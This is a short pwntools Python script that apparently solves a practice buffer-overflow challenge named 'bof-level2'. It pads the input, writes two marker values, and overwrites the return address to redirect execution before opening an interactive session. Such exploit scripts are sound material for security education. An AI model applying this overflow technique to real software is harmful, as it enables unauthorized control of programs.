#!/usr/bin/env python

from pwn import *

p = process('./bof-level2')

print(p.recv())

p.sendline("A" * 20 + p32(0x44434241) + p32(0x48474645) + "A" * 8 + p32(0x8048530))

p.interactive()
